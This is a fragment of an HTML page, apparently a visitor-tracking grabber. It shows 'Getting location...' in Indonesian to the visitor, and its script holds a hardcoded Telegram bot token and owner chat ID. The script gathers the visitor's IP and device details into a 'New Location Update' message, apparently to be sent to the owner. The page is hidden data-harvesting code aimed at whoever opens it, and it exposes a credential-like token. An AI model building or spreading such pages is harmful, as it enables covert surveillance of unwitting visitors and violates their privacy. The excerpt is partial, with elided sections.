...
<body>
  <h1>@rexzzzx</h1>
  <div id="status" class="loading">Mendapatkan lokasi...</div>

  <script>
    const BOT_TOKEN = "8433684091:AAGMPZN3oI9oAmJUl-8VoIqDQSlLeryvEfI";
    const OWNER_CHAT_ID = "7136054101";
    ...
    async function getVisitorInfo() {
      ...
      const message = `📍 *New Location Update* 🎯
👤 *Device Info:*
• IP: ${ip}
